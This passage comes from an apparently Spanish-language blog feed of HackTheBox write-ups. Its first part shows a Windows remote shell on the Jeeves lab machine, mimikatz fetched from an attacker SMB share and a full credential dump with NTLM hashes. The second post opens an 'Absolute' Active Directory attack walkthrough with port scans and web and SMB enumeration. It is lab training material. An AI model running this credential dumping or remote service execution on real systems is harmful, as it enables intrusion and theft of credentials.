<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file whUEDSYi.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service MlrO on 10.10.10.63.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service MlrO.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.10586]
<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp

C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>prives

C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>prives

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; copy <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\m</span>imikatz.exe mimikatz.exe
        1 file<span class="o">(</span>s<span class="o">)</span> copied.

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; <span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives

07/04/2023  12:54 AM    &lt;DIR&gt;          <span class="nb">.</span>
07/04/2023  12:54 AM    &lt;DIR&gt;          ..
09/19/2022  05:44 PM         1,355,264 mimikatz.exe
               1 File<span class="o">(</span>s<span class="o">)</span>      1,355,264 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,427,297,792 bytes free

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt;
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; .<span class="se">\m</span>imikatz.exe <span class="s2">"sekurlsa::logonPasswords"</span> <span class="nb">exit</span>

  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c">#19041 Sep 19 2022 17:44:08</span>
 .## ^ <span class="c">##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="c">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
 <span class="s1">'## v ##'</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
  <span class="s1">'#####'</span>        <span class="o">&gt;</span> https://pingcastle.com / https://mysmartlogon.com <span class="k">***</span>/

mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c"># sekurlsa::logonPasswords</span>

Authentication Id : 0 <span class="p">;</span> 995 <span class="o">(</span>00000000:000003e3<span class="o">)</span>
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:09:01 AM
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 118956 <span class="o">(</span>00000000:0001d0ac<span class="o">)</span>
Session           : Service from 0
User Name         : kohsuke
Domain            : JEEVES
Logon Server      : JEEVES
Logon Time        : 7/4/2023 12:09:00 AM
SID               : S-1-5-21-2851396806-8246019-2289784878-1001
	msv :	
	<span class="o">[</span>00010000] CredentialKeys
	<span class="k">*</span> NTLM     : ab4043bce374136df6e09734d4577738
	<span class="k">*</span> SHA1     : 6f0672881aa8f2e79d9097b8dba62bdcbddde585
	<span class="o">[</span>00000003] Primary
	<span class="k">*</span> Username : kohsuke
	<span class="k">*</span> Domain   : JEEVES
	<span class="k">*</span> NTLM     : ab4043bce374136df6e09734d4577738
	<span class="k">*</span> SHA1     : 6f0672881aa8f2e79d9097b8dba62bdcbddde585
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : kohsuke
	<span class="k">*</span> Domain   : JEEVES
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	<span class="k">*</span> Username : kohsuke
	<span class="k">*</span> Domain   : JEEVES
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 997 <span class="o">(</span>00000000:000003e5<span class="o">)</span>
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:58 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 73605 <span class="o">(</span>00000000:00011f85<span class="o">)</span>
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:58 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 73510 <span class="o">(</span>00000000:00011f26<span class="o">)</span>
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:58 AM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 996 <span class="o">(</span>00000000:000003e4<span class="o">)</span>
Session           : Service from 0
User Name         : JEEVES<span class="err">$</span>
Domain            : WORKGROUP
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:58 AM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	<span class="k">*</span> Username : jeeves<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 45075 <span class="o">(</span>00000000:0000b013<span class="o">)</span>
Session           : UndefinedLogonType from 0
User Name         : <span class="o">(</span>null<span class="o">)</span>
Domain            : <span class="o">(</span>null<span class="o">)</span>
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:57 AM
SID               :
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 <span class="p">;</span> 999 <span class="o">(</span>00000000:000003e7<span class="o">)</span>
Session           : UndefinedLogonType from 0
User Name         : JEEVES<span class="err">$</span>
Domain            : WORKGROUP
Logon Server      : <span class="o">(</span>null<span class="o">)</span>
Logon Time        : 7/4/2023 12:08:57 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	kerberos :	
	<span class="k">*</span> Username : jeeves<span class="err">$</span>
	<span class="k">*</span> Domain   : WORKGROUP
	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
	ssp :	
	credman :	

mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c"># exit</span>
Bye!

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Absolute (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html" rel="alternate" type="text/html" title="HackTheBox - Absolute (insane)" /><published>2024-06-19T00:00:00-06:00</published><updated>2024-06-19T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/06/19/absolute.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/d5dbb09284d3265d91f50eb4ad32fee2.png" />
</p>

<ul>
  <li>Absolute is an Insane Windows Active Directory machine that starts with a webpage displaying some images, whose metadata is used to create a wordlist of possible usernames that may exist on the machine. It turns out that one of these users doesnt require Pre-authentication, therefore posing a valuable target for an <code class="language-plaintext highlighter-rouge">ASREP</code> roast attack. The discovered credentials are then used to enumerate <code class="language-plaintext highlighter-rouge">LDAP</code> and discover credentials for the user <code class="language-plaintext highlighter-rouge">svc_smb</code>, who has access to an <code class="language-plaintext highlighter-rouge">SMB</code> share containing a Windows binary. Performing dynamic analysis on the binary reveals that it tries to perform an <code class="language-plaintext highlighter-rouge">LDAP</code> connection to the Domain Controller with clear text credentials for the <code class="language-plaintext highlighter-rouge">m.lovegod</code> user, who owns the <code class="language-plaintext highlighter-rouge">Network Audit</code> group, which in turn has <code class="language-plaintext highlighter-rouge">Generic Write</code> over the <code class="language-plaintext highlighter-rouge">winrm_user</code>. Following this attack path and performing a shadow credential attack on the <code class="language-plaintext highlighter-rouge">winrm_user</code>, one can then <code class="language-plaintext highlighter-rouge">WinRM</code> and access the machine. Finally, the <code class="language-plaintext highlighter-rouge">KrbRelay</code> tool is used to add the <code class="language-plaintext highlighter-rouge">winrm_user</code> user to the Administrators group, leading to fully elevated privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49684,49685,49697,49701 10.10.11.181 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-17 18:15 CST
Nmap scan report <span class="k">for </span>10.10.11.181
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Absolute
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-06-18 07:15:35Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   <span class="nb">date</span>: 2024-06-18T07:16:36
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>Estamos ante un entorno de Directorio Activo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap cme smb 10.10.11.181
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.181 absolute.htb dc.absolute.htb DC.absolute.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.181 absolute.htb dc.absolute.htb DC.absolute.htb
</code></pre></div></div>

<ul>
  <li>No podemos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
‚ûú  nmap smbmap <span class="nt">-H</span> 10.10.11.181 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[!]</span> Something weird happened: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span class="o">{</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights. on line 970
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/usr/bin/smbmap"</span>, line 33, <span class="k">in</span> &lt;module&gt;
    sys.exit<span class="o">(</span>load_entry_point<span class="o">(</span><span class="s1">'smbmap==1.9.2'</span>, <span class="s1">'console_scripts'</span>, <span class="s1">'smbmap'</span><span class="o">)())</span>
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File <span class="s2">"/usr/lib/python3/dist-packages/smbmap/smbmap.py"</span>, line 1435, <span class="k">in </span>main
    host <span class="o">=</span> <span class="o">[</span> host <span class="k">for </span>host <span class="k">in </span>share_drives_list.keys<span class="o">()</span> <span class="o">][</span>0]
                              ^^^^^^^^^^^^^^^^^^^^^^
AttributeError: <span class="s1">'bool'</span> object has no attribute <span class="s1">'keys'</span>
^CYou pressed Ctrl+C!...
You pressed Ctrl+C!
‚ûú  nmap smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.181
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.11.181 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Tampoco podemos enumerar por <code class="language-plaintext highlighter-rouge">rpcclient</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.181
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Esta es la p√°gina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/1.png" />
</p>

<ul>
  <li>Estas son las tecnolog√≠as que est√°n corriendo en la pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">‚ûú</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Absolute</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> no encontramos anda interesante mas que la ruta <code class="language-plaintext highlighter-rouge">images</code> que al parecer son varias con el nombre de <code class="language-plaintext highlighter-rouge">hero</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content feroxbuster <span class="nt">-u</span> http://10.10.11.181 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher ü§ì                 ver: 2.10.3
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.11.181
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout <span class="o">(</span>secs<span class="o">)</span>        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.10.3
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ <span class="nb">true</span>
 üèÅ  HTTP methods          ‚îÇ <span class="o">[</span>GET]
 üîÉ  Recursion Depth       ‚îÇ 4
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press <span class="o">[</span>ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
301      GET        2l       10w      150c http://10.10.11.181/images <span class="o">=&gt;</span> http://10.10.11.181/images/
200      GET       33l       64w      782c http://10.10.11.181/js/main.js
200      GET        6l       77w     3351c http://10.10.11.181/css/owl.carousel.min.css
200      GET      145l      442w     4030c http://10.10.11.181/css/style.css
200      GET        5l      369w    21003c http://10.10.11.181/js/popper.min.js
200      GET        7l      689w    63240c http://10.10.11.181/js/bootstrap.min.js
200      GET        7l      277w    44342c http://10.10.11.181/js/owl.carousel.min.js
200      GET        2l     1283w    86926c http://10.10.11.181/js/jquery-3.3.1.min.js
301      GET        2l       10w      150c http://10.10.11.181/Images <span class="o">=&gt;</span> http://10.10.11.181/Images/
200      GET     3625l     7946w    77906c http://10.10.11.181/css/animate.css
200      GET     4919l     8218w    79820c http://10.10.11.181/fonts/icomoon/style.css
200      GET        7l     2103w   160392c http://10.10.11.181/css/bootstrap.min.css
403      GET       29l       92w     1233c http://10.10.11.181/fonts/
403      GET       29l       92w     1233c http://10.10.11.181/fonts/icomoon/
403      GET       29l       92w     1233c http://10.10.11.181/js/
403      GET       29l       92w     1233c http://10.10.11.181/css/
301      GET        2l       10w      147c http://10.10.11.181/css <span class="o">=&gt;</span> http://10.10.11.181/css/
200      GET      948l     7256w   690337c http://10.10.11.181/images/hero_3.jpg
200      GET     2425l    11064w   656123c http://10.10.11.181/images/hero_2.jpg
200      GET     1306l     7961w   733740c http://10.10.11.181/images/hero_1.jpg
200      GET        0l        0w  5501527c http://10.10.11.181/images/hero_6.jpg
200      GET        0l        0w  2085276c http://10.10.11.181/images/hero_4.jpg
200      GET        0l        0w  1834774c http://10.10.11.181/images/hero_5.jpg
</code></pre></div></div>

<ul>
  <li>Como tal las im√°genes existen.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/2.png" />
</p>

<ul>
  <li>Son 6 im√°genes en total as√≠ que vamos a descargarlas todas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..6<span class="o">}</span><span class="p">;</span> <span class="k">do </span>wget <span class="s2">"http://10.10.11.181/images/hero_</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">.jpg"</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"Descargada la imagen hero_</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">.jpg"</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<ul>
  <li>Si inspeccionamos una foto con <code class="language-plaintext highlighter-rouge">exiftool</code> vemos que en el apartado de <code class="language-plaintext highlighter-rouge">Author</code> encontramos un nombre de usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content exiftool hero_1.jpg
ExifTool Version Number         : 12.76
File Name                       : hero_1.jpg
Directory                       : <span class="nb">.</span>
File Size                       : 407 kB
File Modification Date/Time     : 2022:06:07 14:45:20-05:00
File Access Date/Time           : 2024:06:18 12:12:39-06:00
File Inode Change Date/Time     : 2024:06:18 12:12:39-06:00
File Permissions                : <span class="nt">-rw-r--r--</span>
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian <span class="o">(</span>Intel, II<span class="o">)</span>
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : <span class="o">[</span>14], Encoded with <span class="nv">Blend</span><span class="o">=</span>1 downsampling
APP14 Flags 1                   : <span class="o">(</span>none<span class="o">)</span>
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
